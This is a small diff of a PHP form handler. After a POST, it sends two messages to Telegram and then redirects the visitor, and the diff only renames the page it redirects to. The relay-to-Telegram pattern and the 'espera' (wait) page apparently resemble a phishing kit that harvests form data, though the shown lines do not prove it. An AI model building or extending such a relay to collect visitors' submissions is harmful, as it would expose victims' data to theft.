@@ -58,7 +58,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $result2 = file_get_contents($url2, false, $context2);
 
     if ($result1 !== false && $result2 !== false) {
-        header("Location: /espera2.html");
+        header("Location: /2.html");
         exit();
     } else {
         echo "Error al enviar los mensajes a Telegram.";
